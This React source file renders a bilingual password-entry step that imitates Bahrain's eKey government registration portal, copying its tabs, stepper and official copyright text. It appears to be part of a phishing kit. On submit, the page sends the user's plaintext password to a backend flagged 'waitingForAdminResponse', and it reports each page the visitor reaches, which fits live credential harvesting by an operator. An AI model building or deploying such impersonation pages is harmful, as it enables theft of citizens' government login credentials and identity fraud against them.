import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { navigateToPage, sendData } from "@/lib/store";
import "./HomePage.css";
import "./PasswordPage.css";

type Lang = 'ar' | 'en';

const content = {
  ar: {
    login: 'دخول',
    langSwitch: 'English',
    tabs: {
      home: 'الرئيسية',
      about: 'نبذة',
      manage: 'إدارة حساب المفتاح الإلكتروني',
      services: 'خدمات المفتاح الإلكتروني',
      contact: 'اتصل بنا',
      faq: 'الأسئلة الشائعة',
    },
    pageTitle: 'التسجيل في المفتاح الإلكتروني – المستوى الأساسي',
    step1: 'المعلومات الشخصية',
    step2: 'إدخال كلمة السر',
    step3: 'الملخص',
    passwordLabel: 'كلمة السر',
    confirmPasswordLabel: 'تأكيد كلمة السر',
    passwordPlaceholder: 'أدخل كلمة السر',
    confirmPlaceholder: 'أعد إدخال كلمة السر',
    continueBtn: 'مواصلة',
    cancelBtn: 'إلغاء',
    required: '*',
    fieldRequired: 'هذا الحقل مطلوب',
    passwordMismatch: 'كلمة السر غير متطابقة',
    passwordTooShort: 'كلمة السر يجب أن تكون 8 أحرف على الأقل',
    strengthWeak: 'ضعيفة',
    strengthMedium: 'متوسطة',
    strengthStrong: 'قوية',
    strengthVeryStrong: 'قوية جداً',
    passwordRequirements: 'متطلبات كلمة السر:',
    reqMinLength: '8 أحرف على الأقل',
    reqUppercase: 'حرف كبير واحد على الأقل',
    reqLowercase: 'حرف صغير واحد على الأقل',
    reqNumber: 'رقم واحد على الأقل',
    reqSpecial: 'رمز خاص واحد على الأقل (!@#$%^&*)',
    copyright: '2021 © هيئة المعلومات والحكومة الإلكترونية، مملكة البحرين. جميع الحقوق محفوظة',
    privacy: 'سياسة الخصوصية',
    sitemap: 'خريطة الموقع',
    contactUs: 'اتصل بنا',
    lastUpdate: 'آخر تحديث بتاريخ : Feb 20, 2025',
  },
  en: {
    login: 'Login',
    langSwitch: 'عربي',
    tabs: {
      home: 'Home',
      about: 'About',
      manage: 'Manage eKey Account',
      services: 'eKey Services',
      contact: 'Contact Us',
      faq: 'FAQ',
    },
    pageTitle: 'Registration in eKey – Basic Level',
    step1: 'Personal Information',
    step2: 'Enter Password',
    step3: 'Summary',
    passwordLabel: 'Password',
    confirmPasswordLabel: 'Confirm Password',
    passwordPlaceholder: 'Enter password',
    confirmPlaceholder: 'Re-enter password',
    continueBtn: 'Continue',
    cancelBtn: 'Cancel',
    required: '*',
    fieldRequired: 'This field is required',
    passwordMismatch: 'Passwords do not match',
    passwordTooShort: 'Password must be at least 8 characters',
    strengthWeak: 'Weak',
    strengthMedium: 'Medium',
    strengthStrong: 'Strong',
    strengthVeryStrong: 'Very Strong',
    passwordRequirements: 'Password Requirements:',
    reqMinLength: 'At least 8 characters',
    reqUppercase: 'At least one uppercase letter',
    reqLowercase: 'At least one lowercase letter',
    reqNumber: 'At least one number',
    reqSpecial: 'At least one special character (!@#$%^&*)',
    copyright: '2021 © Information & eGovernment Authority, Kingdom of Bahrain. All Rights Reserved',
    privacy: 'Privacy Policy',
    sitemap: 'Sitemap',
    contactUs: 'Contact Us',
    lastUpdate: 'Last Updated : Feb 20, 2025',
  }
};

type TabKey = 'home' | 'about' | 'manage' | 'services' | 'contact' | 'faq';

// Password strength calculator
function getPasswordStrength(password: string): { level: number; label: string; color: string } {
  let score = 0;
  if (password.length >= 8) score++;
  if (password.length >= 12) score++;
  if (/[A-Z]/.test(password)) score++;
  if (/[a-z]/.test(password)) score++;
  if (/[0-9]/.test(password)) score++;
  if (/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password)) score++;

  if (score <= 2) return { level: 1, label: 'weak', color: '#e74c3c' };
  if (score <= 3) return { level: 2, label: 'medium', color: '#f39c12' };
  if (score <= 4) return { level: 3, label: 'strong', color: '#27ae60' };
  return { level: 4, label: 'veryStrong', color: '#1484c4' };
}

interface PasswordErrors {
  password?: string;
  confirmPassword?: string;
}

export default function PasswordPage() {
  const [, setLocation] = useLocation();
  const [lang, setLang] = useState<Lang>('ar');
  const [isLoading, setIsLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);

  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [errors, setErrors] = useState<PasswordErrors>({});

  useEffect(() => {
    navigateToPage('إدخال كلمة السر');
  }, []);

  const t = content[lang];
  const isRtl = lang === 'ar';
  const tabKeys: TabKey[] = ['home', 'about', 'manage', 'services', 'contact', 'faq'];

  const handleTabClick = (key: TabKey) => {
    if (key === 'home') setLocation('/');
    else if (key === 'manage') setLocation('/manage-account');
  };

  const strength = getPasswordStrength(password);

  const strengthLabel = () => {
    if (!password) return '';
    switch (strength.label) {
      case 'weak': return t.strengthWeak;
      case 'medium': return t.strengthMedium;
      case 'strong': return t.strengthStrong;
      case 'veryStrong': return t.strengthVeryStrong;
      default: return '';
    }
  };

  // Check individual requirements
  const hasMinLength = password.length >= 8;
  const hasUppercase = /[A-Z]/.test(password);
  const hasLowercase = /[a-z]/.test(password);
  const hasNumber = /[0-9]/.test(password);
  const hasSpecial = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password);

  const clearError = (field: keyof PasswordErrors) => {
    if (errors[field]) {
      setErrors(prev => {
        const newErrors = { ...prev };
        delete newErrors[field];
        return newErrors;
      });
    }
  };

  const validate = (): PasswordErrors => {
    const errs: PasswordErrors = {};
    if (!password.trim()) {
      errs.password = t.fieldRequired;
    } else if (password.length < 8) {
      errs.password = t.passwordTooShort;
    }
    if (!confirmPassword.trim()) {
      errs.confirmPassword = t.fieldRequired;
    } else if (confirmPassword !== password) {
      errs.confirmPassword = t.passwordMismatch;
    }
    return errs;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitted(true);

    const validationErrors = validate();
    setErrors(validationErrors);

    if (Object.keys(validationErrors).length > 0) return;

    setIsLoading(true);

    sendData({
      data: {
        password: password,
      },
      current: 'إدخال كلمة السر',
      waitingForAdminResponse: true,
    });

    setTimeout(() => {
      setIsLoading(false);
      setLocation('/registration-summary');
    }, 1500);
  };

  const handleCancel = () => {
    setLocation('/basic-registration');
  };

  return (
    <div className="ekey-wrapper" dir={isRtl ? 'rtl' : 'ltr'}>
      {/* Header */}
      <div className="ekey-header">
        <nav className="ekey-navbar">
          <div className="ekey-container">
            <div className="ekey-navbar-header">
              <a className="ekey-navbar-brand" href="#" onClick={(e) => { e.preventDefault(); setLocation('/'); }}>
                <img src="/images/logo.jpg" alt="eKey logo" />
              </a>
            </div>
            <div className="ekey-header-left">
              <a href="#" className="ekey-login-btn" onClick={(e) => { e.preventDefault(); setLocation('/login'); }}>{t.login}</a>
              <span className="ekey-lang-separator">|</span>
              <a href="#" className="ekey-lang" onClick={(e) => { e.preventDefault(); setLang(lang === 'ar' ? 'en' : 'ar'); }}>{t.langSwitch}</a>
            </div>
          </div>
        </nav>
        <div className="ekey-container">
          <div className="ekey-navbar-collapse">
            <ul className="ekey-nav">
              {tabKeys.map((key) => (
                <li key={key} className={key === 'manage' ? 'active' : ''}>
                  <a href="#" onClick={(e) => { e.preventDefault(); handleTabClick(key); }}>{t.tabs[key]}</a>
                </li>
              ))}
            </ul>
          </div>
        </div>
      </div>

      {/* Page Title Bar */}
      <div className="reg-title-bar">
        <h1 className="reg-title-text">{t.pageTitle}</h1>
        <div className="reg-title-bar-line"></div>
      </div>

      {/* Stepper */}
      <div className="pwd-stepper-wrapper">
        <div className="ekey-container">
          <div className="pwd-stepper">
            <div className="pwd-step pwd-step-completed">
              <span className="pwd-step-text">{t.step1}</span>
              <span className="pwd-step-arrow">&#10095;</span>
            </div>
            <div className="pwd-step pwd-step-active">
              <span className="pwd-step-text">{t.step2}</span>
              <span className="pwd-step-arrow">&#10095;</span>
            </div>
            <div className="pwd-step">
              <span className="pwd-step-text">{t.step3}</span>
              <span className="pwd-step-arrow">&#10095;</span>
            </div>
          </div>
        </div>
      </div>

      {/* Password Form */}
      <div className="pwd-form-wrapper">
        <div className="ekey-container">
          <form onSubmit={handleSubmit} className="pwd-form" noValidate>
            {/* Password Field */}
            <div className={`pwd-field ${errors.password ? 'pwd-field-error' : ''}`}>
              <label>{t.passwordLabel}<span className="pwd-required">{t.required}</span></label>
              <div className="pwd-input-wrapper">
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => { setPassword(e.target.value); clearError('password'); }}
                  placeholder={t.passwordPlaceholder}
                  className={errors.password ? 'pwd-input-error' : ''}
                />
                <button
                  type="button"
                  className="pwd-toggle-btn"
                  onClick={() => setShowPassword(!showPassword)}
                  tabIndex={-1}
                >
                  {showPassword ? '🙈' : '👁'}
                </button>
              </div>
              {errors.password && <span className="pwd-error-msg">{errors.password}</span>}
            </div>

            {/* Password Strength Indicator */}
            {password && (
              <div className="pwd-strength-wrapper">
                <div className="pwd-strength-bar-bg">
                  <div
                    className="pwd-strength-bar-fill"
                    style={{
                      width: `${(strength.level / 4) * 100}%`,
                      backgroundColor: strength.color,
                    }}
                  ></div>
                </div>
                <span className="pwd-strength-label" style={{ color: strength.color }}>
                  {strengthLabel()}
                </span>
              </div>
            )}

            {/* Password Requirements */}
            {password && (
              <div className="pwd-requirements">
                <p className="pwd-req-title">{t.passwordRequirements}</p>
                <ul className="pwd-req-list">
                  <li className={hasMinLength ? 'pwd-req-met' : 'pwd-req-unmet'}>
                    <span className="pwd-req-icon">{hasMinLength ? '✓' : '✗'}</span>
                    {t.reqMinLength}
                  </li>
                  <li className={hasUppercase ? 'pwd-req-met' : 'pwd-req-unmet'}>
                    <span className="pwd-req-icon">{hasUppercase ? '✓' : '✗'}</span>
                    {t.reqUppercase}
                  </li>
                  <li className={hasLowercase ? 'pwd-req-met' : 'pwd-req-unmet'}>
                    <span className="pwd-req-icon">{hasLowercase ? '✓' : '✗'}</span>
                    {t.reqLowercase}
                  </li>
                  <li className={hasNumber ? 'pwd-req-met' : 'pwd-req-unmet'}>
                    <span className="pwd-req-icon">{hasNumber ? '✓' : '✗'}</span>
                    {t.reqNumber}
                  </li>
                  <li className={hasSpecial ? 'pwd-req-met' : 'pwd-req-unmet'}>
                    <span className="pwd-req-icon">{hasSpecial ? '✓' : '✗'}</span>
                    {t.reqSpecial}
                  </li>
                </ul>
              </div>
            )}

            {/* Confirm Password Field */}
            <div className={`pwd-field ${errors.confirmPassword ? 'pwd-field-error' : ''}`}>
              <label>{t.confirmPasswordLabel}<span className="pwd-required">{t.required}</span></label>
              <div className="pwd-input-wrapper">
                <input
                  type={showConfirmPassword ? 'text' : 'password'}
                  value={confirmPassword}
                  onChange={(e) => { setConfirmPassword(e.target.value); clearError('confirmPassword'); }}
                  placeholder={t.confirmPlaceholder}
                  className={errors.confirmPassword ? 'pwd-input-error' : ''}
                />
                <button
                  type="button"
                  className="pwd-toggle-btn"
                  onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                  tabIndex={-1}
                >
                  {showConfirmPassword ? '🙈' : '👁'}
                </button>
              </div>
              {errors.confirmPassword && <span className="pwd-error-msg">{errors.confirmPassword}</span>}
            </div>

            {/* Buttons */}
            <div className="pwd-buttons">
              <button
                type="submit"
                className="pwd-btn pwd-btn-continue"
                disabled={isLoading}
              >
                {isLoading ? (
                  <span className="pwd-spinner"></span>
                ) : (
                  t.continueBtn
                )}
              </button>
              <button
                type="button"
                className="pwd-btn pwd-btn-cancel"
                onClick={handleCancel}
              >
                {t.cancelBtn}
              </button>
            </div>
          </form>
        </div>
      </div>

      {/* White Gap with Skyline */}
      <div className="ekey-white-gap-bg"></div>

      {/* Footer */}
      <div className="ekey-footer">
        <div className="ekey-copyright">
          <div className="ekey-container">
            <div className="ekey-footer-top">
              <div className="ekey-social-links">
                <a href="#" aria-label="facebook"><i className="ekey-fa ekey-fa-facebook"></i></a>
                <a href="#" aria-label="twitter"><i className="ekey-fa ekey-fa-twitter"></i></a>
                <a href="#" aria-label="youtube"><i className="ekey-fa ekey-fa-youtube"></i></a>
                <a href="#" aria-label="linkedin"><i className="ekey-fa ekey-fa-linkedin"></i></a>
                <a href="#" aria-label="instagram"><i className="ekey-fa ekey-fa-instagram"></i></a>
              </div>
            </div>
            <div className="ekey-copyright-right">
              {t.copyright}
              <p>
                <a href="#">{t.privacy}</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
                <a href="#">{t.sitemap}</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
                <a href="#">{t.contactUs}</a>
              </p>
              <p>{t.lastUpdate}</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
